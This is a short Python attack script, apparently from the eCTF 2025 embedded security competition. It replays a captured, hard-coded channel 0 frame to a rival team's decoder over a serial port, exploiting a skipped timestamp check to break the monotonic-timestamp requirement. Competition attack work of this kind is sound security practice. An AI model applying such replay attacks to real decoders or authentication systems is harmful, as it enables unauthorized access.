"""Pesky Neighbor attack for tufts
@author: Gavin Zhong, Liz Grzyb
@description: UTEP bypasses the timestamp check for channel 0, so by simply replaying lgmt channel 0 frame,
we can make it violate security requirement 3 (monotonically increasing timestamps)
"""

import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_0() -> bytes:
    """Liz Grzyb
        simply replay lgmt channel 0 frame
    """
    lgmt_frame_channel0 = b"Lu\x82\xec\xf9\x1f$\xf7\xd8\xc1^\xbd\xaei\xea\x85S\x18\x06\xa5\x97\xa8\xd0\xbdX\xdeH\xf46\xaf)\xd8\x05\xd3g7\xe8\xdcm\xde\xfb\xe2C\x0e!#;\x1ba\xb7J\x16\xf6,\xebk\x81|\x96\x87i(\xf2\xfb\x8b3_G\x0fZ*\x0cB\xc1\xdd]HY*\xfc\x07(\x82'nd\xfb\xd8\xa4\x89S \xa33\x04\xee*I$;\x0b\xa6x\x96"
    return lgmt_frame_channel0


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_0())
    interface.decode(lgmt_channel_0())

    print("Done with pesky Neighbor attack")
